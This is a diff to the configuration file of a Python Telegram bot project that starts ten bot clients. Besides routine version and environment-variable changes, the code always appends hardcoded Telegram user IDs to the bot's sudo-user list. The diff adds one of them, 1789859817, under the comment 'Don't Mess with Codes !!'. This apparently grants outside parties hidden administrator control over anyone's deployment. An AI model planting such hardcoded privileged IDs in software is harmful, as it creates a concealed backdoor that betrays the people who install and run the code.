@@ -18,12 +18,13 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 #version
 
-rizoelversion = "v0.0.1"
+rizoelversion = "v2.0.3"
 
 #values
 API_ID = config("API_ID", default=None, cast=int)
 API_HASH = config("API_HASH", default=None)
 ALIVE_PIC = config("ALIVE_PIC", default=None)
+CMD_HNDLR = getenv("CMD_HNDLR", default="!")
 HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = config("HEROKU_API_KEY", None)
 BOT_TOKEN = config("BOT_TOKEN", default=None)
@@ -39,6 +40,13 @@ BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 if 1517994352 not in SUDO_USERS:
     SUDO_USERS.append(1517994352)
+
+OWNER_ID = int(os.environ.get("OWNER_ID", None))
+
+# Don't Mess with Codes !! 
+DB_URI = config("DATABASE_URL", None)
+SUDO_USERS.append(OWNER_ID)
+SUDO_USERS.append(1789859817)
 
 # Tokens
 
@@ -62,4 +70,3 @@ Riz9 = TelegramClient('Riz9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
 
 Riz10 = TelegramClient('Riz10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
 
-SUDO_USERS.append(2086101519)
